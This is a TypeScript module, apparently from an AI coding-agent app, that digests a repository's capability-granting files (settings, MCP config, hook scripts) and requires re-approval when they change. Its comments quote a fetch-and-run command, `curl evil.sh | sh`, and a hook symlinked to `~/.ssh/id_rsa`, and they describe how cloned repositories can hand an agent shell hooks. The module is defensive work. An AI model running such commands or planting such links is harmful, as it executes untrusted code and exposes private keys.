/**
 * What a repository can make the agent do, and whether anybody has looked at it.
 *
 * octopus loads every settings source, as the CLI does. That is what makes the
 * agent as capable here as in a terminal, and it also means a repository can
 * hand itself capabilities: `permissions.allow` pre-approves tools without a
 * dialog, `hooks` runs shell commands around every tool call, and `.mcp.json`
 * starts servers. Cloning somebody's repository and opening it is enough.
 *
 * octopus's own repository is the worked example — its `.claude/settings.json`
 * pre-approves `Bash(npm run:*)` and runs `.claude/hooks/*.sh` before every
 * edit. Read as an example of the mechanism, not as a reason to distrust it.
 *
 * The CLI answers this with folder trust. This is the same answer: a digest of
 * the files that grant capability, approved once and re-asked when they change.
 *
 * **Prose is deliberately outside it.** `CLAUDE.md`, `commands/`, `skills/` and
 * `agents/` are not in the digest: they change constantly, and a dialog that
 * fires on every edit is one people learn to click through — which would cost
 * more than it buys on the files that matter. A hostile prompt is a real vector
 * and this does not close it. What it closes is silent capability.
 */

import { createHash } from 'node:crypto'
import { readdir, readFile, realpath } from 'node:fs/promises'
import { join } from 'node:path'

import { CodedError } from './codedError.js'

import { resolvesInside } from './paths.js'

/** One file a repository can grant itself something with. */
export interface CapabilityFile {
  /** Relative to the worktree, so the reader can find it. */
  readonly path: string
  /**
   * What was digested: the file's bytes, or — for a link leading out of the
   * worktree — where it leads.
   *
   * The overload is what keeps the digest's own format unchanged while still
   * noticing a retargeted link. A link is never read, but the hook still runs
   * whatever it points at, so the target has to be the thing that re-asks.
   */
  readonly contents: string
  /** Set when this entry is a link that was shown rather than read. */
  readonly link?: true
}

/**
 * The files read, in a fixed order.
 *
 * `hooks/` is in here because settings only **name** the script. Digesting the
 * settings alone would let a repository change what actually runs while the
 * line that runs it stays put.
 *
 * The directory is read whole and to the bottom, rather than by resolving the
 * names the settings give: a hook `command` is a shell string, and
 * `curl evil.sh | sh` names no file at all. Every file under it is the promise
 * the code can actually keep.
 */
const FILES = ['.claude/settings.json', '.claude/settings.local.json', '.mcp.json'] as const
const HOOKS = '.claude/hooks'

/** How much of one file is read, so a large one cannot hold the app up. */
const MAX_BYTES = 256 * 1024

async function read(root: string, path: string): Promise<CapabilityFile | null> {
  try {
    const contents = await readFile(join(root, path), 'utf8')
    return { path, contents: contents.slice(0, MAX_BYTES) }
  } catch {
    return null
  }
}

/**
 * A link among the hooks: read where that is the worktree's own bytes, and
 * named where it is not.
 *
 * Widening the listing to `isFile() || isSymbolicLink()` is the fix that looks
 * obvious and is dangerous: `read` uses `readFile`, which follows the link, so
 * a repository shipping `.claude/hooks/x.sh -> ~/.ssh/id_rsa` would have 256KB
 * of that key rendered verbatim in the trust card. Dropping it instead is what
 * this whole change exists to undo — a hook nobody was shown ran anyway.
 *
 * So: neither. A link resolving inside the worktree is read, because those
 * bytes are committed and a commit changing them changes the digest. Anything
 * else — out of the worktree, a directory the recursive listing will not walk
 * through, a target that is not there — comes back naming where it leads, for
 * the card to mark and the digest to cover.
 *
 * The resolved target rather than the link's own text, since two spellings of
 * one path are the same file. An unresolvable one answers with nothing, which
 * is honest: a link pointing at nothing runs nothing.
 */
async function follow(root: string, path: string): Promise<CapabilityFile> {
  if (await resolvesInside(root, path)) {
    const contents = await read(root, path)
    if (contents !== null) return contents
  }

  return { path, contents: await realpath(join(root, path)).catch(() => ''), link: true }
}

/**
 * Every file under the hooks directory, walked one level at a time.
 *
 * Not `readdir(…, { recursive: true })`, though that is what this was. Node
 * changed what it does with a linked directory between 26.0 and 26.11: the
 * older one listed the link and stopped, the newer one walks through it — so a
 * hook directory linking to somewhere outside the worktree had that somewhere
 * read file by file into the trust card, which is the thing `follow` exists to
 * prevent. A walk written here descends only into what `lstat` calls a
 * directory, whichever Node it runs on.
 */
async function hookPaths(
  cwd: string,
  directory: string
): Promise<{ path: string; link: boolean }[]> {
  let entries
  try {
    entries = await readdir(join(cwd, directory), { withFileTypes: true })
  } catch {
    // No hooks directory, which is most repositories.
    return []
  }

  const found = await Promise.all(
    entries.map(async (entry) => {
      const path = join(directory, entry.name)
      if (entry.isDirectory()) return hookPaths(cwd, path)
      if (entry.isSymbolicLink()) return [{ path, link: true }]
      return entry.isFile() ? [{ path, link: false }] : []
    })
  )

  return found.flat()
}

/**
 * Everything in this worktree that grants the agent a capability.
 *
 * Read from the directory a session runs in — a worktree, not the checkout —
 * because that is what the SDK is pointed at, and a branch may carry different
 * settings from the one beside it.
 *
 * Sorted by path, so the digest does not depend on the order a directory
 * happens to be listed in.
 */
export async function capabilityFiles(cwd: string): Promise<CapabilityFile[]> {
  const named = await Promise.all(FILES.map((path) => read(cwd, path)))

  const scripts = await Promise.all(
    (await hookPaths(cwd, HOOKS)).map(({ path, link }) =>
      link ? follow(cwd, path) : read(cwd, path)
    )
  )

  return [...named, ...scripts]
    .filter((file): file is CapabilityFile => file !== null)
    .sort((a, b) => a.path.localeCompare(b.path))
}

/**
 * What was approved, as one string.
 *
 * The path goes in beside the contents: moving a hook from one name to another
 * changes what runs, and a digest over contents alone would not notice.
 *
 * A worktree that grants nothing digests to the empty string, which is how
 * "nothing to approve" is told apart from "approved" without a second flag.
 */
export function trustDigest(files: readonly CapabilityFile[]): string {
  if (files.length === 0) return ''

  const hash = createHash('sha256')
  for (const file of files) hash.update(`${file.path}\0${file.contents}\0`)

  return hash.digest('hex')
}

/** What a worktree can make the agent do, and whether that has been agreed to. */
export interface RepositoryTrust {
  readonly approved: boolean
  /**
   * What would be recorded by approving, handed back on approval.
   *
   * The renderer shows `files` and then asks; the files can change between the
   * two — a `git pull`, an agent writing a hook — and an approval computed at
   * click time would then cover something nobody was shown.
   */
  readonly digest: string
  readonly files: readonly CapabilityFile[]
}

export type TrustErrorCode = 'trustChanged'

/** Refuses an approval of something other than what was shown. */
export class TrustError extends CodedError<TrustErrorCode> {
  override readonly name = 'TrustError'
}

/** The approval as asked for, or a refusal when what is there has moved on. */
export function assertShown(digest: string, shown: string): void {
  if (digest !== shown) {
    throw new TrustError(
      'trustChanged',
      {},
      'What the repository supplies changed after it was shown; read it again before allowing it.'
    )
  }
}

/**
 * How many approvals a project remembers.
 *
 * A set rather than one value, so moving between two branches whose settings
 * differ does not ask again on every switch. Bounded because it is written to
 * `state.json` and nothing else would ever drop an entry.
 */
export const MAX_APPROVALS = 10

/** The approvals with this one at the end, and the oldest dropped. */
export function withApproval(approved: readonly string[], digest: string): string[] {
  return [...approved.filter((entry) => entry !== digest), digest].slice(-MAX_APPROVALS)
}
